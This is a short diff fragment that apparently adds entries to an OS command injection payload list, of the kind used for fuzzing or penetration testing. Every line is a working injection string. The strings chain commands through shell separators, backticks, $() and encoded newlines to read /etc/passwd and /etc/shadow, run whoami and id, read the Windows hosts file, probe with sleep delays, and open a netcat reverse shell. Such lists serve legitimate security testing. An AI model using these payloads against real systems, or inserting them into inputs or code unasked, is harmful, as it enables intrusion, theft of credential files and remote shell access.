@@ -19,3 +19,18 @@ $(cat /etc/passwd)
 && whoami
 ; netstat -an
 ; ping -c 4 127.0.0.1
+; ls -la
+| cat /etc/passwd
+&& whoami
+`id`
+$(id)
+; cat /etc/shadow
+| nc -e /bin/sh 127.0.0.1 4444
+; ping -c 1 127.0.0.1
+& dir
+| type C:\Windows\System32\drivers\etc\hosts
+%0als
+%0Acat /etc/passwd
+;sleep 5
+| sleep 5
+
